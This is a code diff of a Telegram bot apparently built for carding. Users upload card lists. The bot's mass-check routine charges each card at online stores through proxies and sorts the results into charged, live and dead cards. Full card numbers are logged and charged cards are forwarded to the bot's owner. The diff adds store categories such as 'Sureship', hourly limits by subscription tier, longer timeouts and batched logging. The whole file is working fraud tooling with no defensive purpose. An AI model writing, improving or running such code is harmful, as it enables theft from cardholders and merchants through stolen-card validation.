@@ -58,15 +58,11 @@ CB_PRICE_10 = "mc_price_10"
 CB_PRICE_ALL = "mc_price_all"
 CB_PRICE_HQ = "mc_price_hq"
 CB_PRICE_V40 = "mc_price_v40"
+CB_PRICE_SURESHIP = "mc_price_sureship"
+CB_PRICE_ALL_COMBINED = "mc_price_all_combined"
 CB_CANCEL = "mc_cancel"
 
-TIER_CONFIG = {
-    "FREE":  {"workers": 10,  "card_limit": 500},
-    "BASIC": {"workers": 20,  "card_limit": 1000},
-    "PRO":   {"workers": 30,  "card_limit": 5000},
-    "MAX":   {"workers": 50,  "card_limit": 10000},
-    "ULTRA": {"workers": 200, "card_limit": 50000},
-}
+from core.tier_manager import TIER_CONFIG
 
 
 async def mass_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -149,10 +145,19 @@ async def receive_card_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return WAITING_FOR_FILE
 
-    # Get user tier
-    db_user = conn.execute("SELECT tier FROM users WHERE user_id = ?", (user.id,)).fetchone()
-    tier = db_user["tier"] if db_user else "FREE"
-    tier_cfg = TIER_CONFIG.get(tier, TIER_CONFIG["FREE"])
+    # Hourly rate limit check
+    from core.tier_manager import get_user_tier
+    from core.rate_limiter import get_hourly_message
+    tier = get_user_tier(conn, user.id)
+    hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier, len(cards))
+    if not hourly_ok:
+        await update.message.reply_text(get_hourly_message(tier, hourly_remaining))
+        return ConversationHandler.END
+
+    # Get user tier (auto-downgrades if expired)
+    tier = get_user_tier(conn, user.id)
+    from core.tier_manager import get_tier_config
+    tier_cfg = get_tier_config(tier)
     card_limit = tier_cfg["card_limit"]
 
     # Apply tier limit
@@ -174,13 +179,15 @@ async def receive_card_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     # Show options with inline buttons
     text = format_mass_check_options(
-        count_5=counts["5"],
-        count_10=counts["10"],
-        count_all=counts["all"],
-        card_count=len(cards),
-        limit_warning=limit_warning,
-        count_hq=counts.get("hq", 0),
-        count_v40=counts.get("v40", 0),
+        c5=counts["5"],
+        c10=counts["10"],
+        call=counts["all"],
+        cc=len(cards),
+        warn=limit_warning,
+        chq=counts.get("hq", 0),
+        cv40=counts.get("v40", 0),
+        csureship=counts.get("sureship", 0),
+        call_combined=counts.get("all_combined", 0),
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -194,15 +201,23 @@ async def receive_card_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ],
         [
             InlineKeyboardButton(
-                f"All Sites ({counts['all']})", callback_data=CB_PRICE_ALL,
-            ),
-        ],
-        [
-            InlineKeyboardButton(
                 f"✅ HQ ({counts.get('hq', 0)})", callback_data=CB_PRICE_HQ,
             ),
             InlineKeyboardButton(
                 f"⚡ V40 ({counts.get('v40', 0)})", callback_data=CB_PRICE_V40,
+            ),
+        ],
+        [
+            InlineKeyboardButton(
+                f"🚀 Sureship ({counts.get('sureship', 0)})", callback_data=CB_PRICE_SURESHIP,
+            ),
+            InlineKeyboardButton(
+                f"📦 Working ({counts['all']})", callback_data=CB_PRICE_ALL,
+            ),
+        ],
+        [
+            InlineKeyboardButton(
+                f"🌐 ALL Sites ({counts.get('all_combined', 0)})", callback_data=CB_PRICE_ALL_COMBINED,
             ),
         ],
         [
@@ -244,11 +259,13 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     # Determine price range
     price_map = {
-        CB_PRICE_5:        ("5",        "$1 - $5"),
-        CB_PRICE_10:       ("10",       "$1 - $10"),
-        CB_PRICE_ALL:      ("all",      "All Sites"),
-        CB_PRICE_HQ:       ("hq",       "HQ Sites"),
-        CB_PRICE_V40:      ("v40",      "V40 Sites"),
+        CB_PRICE_5:           ("5",            "$1 - $5"),
+        CB_PRICE_10:          ("10",           "$1 - $10"),
+        CB_PRICE_ALL:         ("all",          "Working Sites"),
+        CB_PRICE_HQ:          ("hq",           "HQ Sites"),
+        CB_PRICE_V40:         ("v40",          "V40 Sites"),
+        CB_PRICE_SURESHIP:    ("sureship",     "Sureship Sites"),
+        CB_PRICE_ALL_COMBINED:("all_combined", "ALL Sites"),
     }
 
     if data not in price_map:
@@ -333,7 +350,6 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return None
 
     # Save state for resume
-    conn = ctx.bot_data["db"]
     save_state(conn, user.id, chat_id, cards, stores, range_label, 0, message_id)
     state_row = conn.execute(
         "SELECT id FROM mass_check_state WHERE user_id = ? AND status = 'running' ORDER BY id DESC LIMIT 1",
@@ -345,7 +361,7 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         cards=cards,
         stores=stores,
         workers=workers,
-        timeout=15,
+        timeout=25,
         progress_callback=progress_cb,
         progress_interval=3.0,
         proxy_provider=proxy_provider,
@@ -381,10 +397,12 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             chat_id=chat_id, text=live_text, parse_mode=ParseMode.HTML,
         )
 
-    # Update user stats
-    increment_check_stats(conn, user.id, "charged", len(result.charged))
-    increment_check_stats(conn, user.id, "live", len(result.live))
-    increment_check_stats(conn, user.id, "dead", len(result.dead))
+    # Update user stats (batched)
+    from core.database import batch_increment_stats
+    batch_increment_stats(conn, user.id,
+                          charged=len(result.charged),
+                          live=len(result.live),
+                          dead=len(result.dead))
 
     # Log to history
     log_check_history(
@@ -400,20 +418,10 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     # Clean up rate limiter
     rate_limiter.end_mass(user.id)
 
-    # Log charged cards individually
+    # Log charged cards (batched)
     if result.charged:
-        from core.database import log_charged_card
-        for card, res in result.charged:
-            log_charged_card(
-                conn, user.id,
-                card_number=card.number,
-                card_masked=card.masked,
-                gateway=res.gateway,
-                response=res.message,
-                price=res.price,
-                store_url=res.store,
-                bin_code=card.bin,
-            )
+        from core.database import batch_log_charged_cards
+        batch_log_charged_cards(conn, user.id, result.charged)
 
         # Forward charged cards to owner
         try:
@@ -477,9 +485,10 @@ async def resume_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Get tier config
-    tier = ctx.user_data.get("mass_check_tier", "FREE")
-    tier_cfg = TIER_CONFIG.get(tier, TIER_CONFIG["FREE"])
+    # Get tier config from DB (not user_data — it was popped)
+    from core.tier_manager import get_user_tier, get_tier_config
+    tier = get_user_tier(conn, user.id)
+    tier_cfg = get_tier_config(tier)
     workers = tier_cfg["workers"]
     range_label = state["price_range"] or "All Sites"
 
@@ -527,7 +536,7 @@ async def resume_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return None
 
     result = await mass_check(
-        cards=cards, stores=stores, workers=workers, timeout=15,
+        cards=cards, stores=stores, workers=workers, timeout=25,
         progress_callback=progress_cb, progress_interval=3.0,
         proxy_provider=proxy_provider, state_conn=conn, state_id=state_id,
         health_cache=health_cache,
@@ -554,9 +563,10 @@ async def resume_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML,
         )
 
-    increment_check_stats(conn, user.id, "charged", len(result.charged))
-    increment_check_stats(conn, user.id, "live", len(result.live))
-    increment_check_stats(conn, user.id, "dead", len(result.dead))
+    batch_increment_stats(conn, user.id,
+                          charged=len(result.charged),
+                          live=len(result.live),
+                          dead=len(result.dead))
     log_check_history(
         conn, user.id, "mass_resume", cards_total=result.total,
         live=len(result.live), dead=len(result.dead), charged=len(result.charged),
